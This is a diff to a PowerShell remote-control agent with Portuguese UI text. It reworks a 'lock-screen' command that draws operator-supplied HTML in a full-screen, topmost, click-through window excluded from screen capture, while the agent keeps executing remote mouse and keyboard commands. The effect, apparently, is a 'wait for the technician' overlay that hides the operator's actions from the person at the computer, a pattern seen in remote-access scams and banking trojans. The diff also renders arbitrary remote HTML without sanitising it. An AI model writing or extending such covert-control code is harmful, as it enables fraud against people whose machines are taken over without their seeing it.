@@ -202,9 +202,56 @@ function DoMove($x, $y) {
     [Input]::MoveTo($rx, $ry) | Out-Null
 }
 
-function Lock($msg) {
+function Lock($html) {
     if ($Global:locked) { return }
     $Global:locked = $true
+
+    # Debug: salva o HTML recebido em arquivo temporário
+    try { "$html" | Out-File "$env:TEMP\lockhtml_debug.txt" -Force } catch {}
+
+    $defaultHtml = @"
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+    background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 50%, #0a0a0f 100%);
+    height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: 'Segoe UI', Arial, sans-serif;
+    color: white;
+    overflow: hidden;
+}
+.container { text-align: center; }
+h1 { font-size: 48px; font-weight: 300; margin-bottom: 20px; }
+p { font-size: 18px; color: rgba(255,255,255,0.6); }
+.spinner {
+    width: 50px; height: 50px;
+    border: 3px solid rgba(255,255,255,0.1);
+    border-top-color: #3b82f6;
+    border-radius: 50%;
+    margin: 30px auto;
+    animation: spin 1s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+<div class="container">
+    <h1>Aguarde o tecnico...</h1>
+    <div class="spinner"></div>
+    <p>Por favor, aguarde o tecnico liberar a tela.</p>
+</div>
+</body>
+</html>
+"@
+
+    $htmlContent = if ($html -and $html -ne 'null' -and $html -ne '' -and $html.Length -gt 50) { $html } else { $defaultHtml }
+    $htmlB64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($htmlContent))
 
     $code = @"
 Add-Type -AssemblyName System.Windows.Forms
@@ -221,29 +268,22 @@ public class LockAPI {
     public static extern int SetWindowLong(IntPtr hwnd, int index, int value);
 }
 '@
+`$h = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$htmlB64'))
 `$f = New-Object Windows.Forms.Form
 `$f.FormBorderStyle = 'None'
 `$f.StartPosition = 'Manual'
 `$f.Location = [Drawing.Point]::new(0, 0)
 `$f.Size = [Windows.Forms.Screen]::PrimaryScreen.Bounds.Size
 `$f.TopMost = `$true
-`$f.BackColor = [Drawing.Color]::FromArgb(10, 10, 15)
 `$f.ShowInTaskbar = `$false
-`$t = New-Object Windows.Forms.Label
-`$t.Text = '$msg'
-`$t.Font = New-Object Drawing.Font('Segoe UI', 36, [Drawing.FontStyle]::Bold)
-`$t.ForeColor = [Drawing.Color]::White
-`$t.AutoSize = `$true
-`$s = New-Object Windows.Forms.Label
-`$s.Text = 'Por favor, aguarde o tecnico liberar a tela.'
-`$s.Font = New-Object Drawing.Font('Segoe UI', 16)
-`$s.ForeColor = [Drawing.Color]::Gray
-`$s.AutoSize = `$true
-`$f.Controls.Add(`$t)
-`$f.Controls.Add(`$s)
+`$w = New-Object Windows.Forms.WebBrowser
+`$w.Dock = 'Fill'
+`$w.ScrollBarsEnabled = `$false
+`$w.IsWebBrowserContextMenuEnabled = `$false
+`$w.AllowNavigation = `$false
+`$f.Controls.Add(`$w)
 `$f.Add_Shown({
-    `$t.Location = [Drawing.Point]::new((`$f.Width - `$t.Width) / 2, `$f.Height / 2 - 50)
-    `$s.Location = [Drawing.Point]::new((`$f.Width - `$s.Width) / 2, `$f.Height / 2 + 20)
+    `$w.DocumentText = `$h
     [LockAPI]::SetWindowDisplayAffinity(`$f.Handle, 17)
     `$st = [LockAPI]::GetWindowLong(`$f.Handle, -20)
     [LockAPI]::SetWindowLong(`$f.Handle, -20, `$st -bor 0x80000 -bor 0x20)
@@ -319,7 +359,7 @@ function Run {
                             "mouse-scroll" { DoScroll $msg.delta }
                             "key-press" { DoKey $msg.key }
                             "key-combination" { DoCombo $msg.keys }
-                            "lock-screen" { Lock $(if ($msg.message) { $msg.message } else { "Aguarde..." }) }
+                            "lock-screen" { Lock $msg.html }
                             "unlock-screen" { Unlock }
                             "set-quality" {
                                 $Global:quality = if ($msg.quality) { $msg.quality } else { 70 }
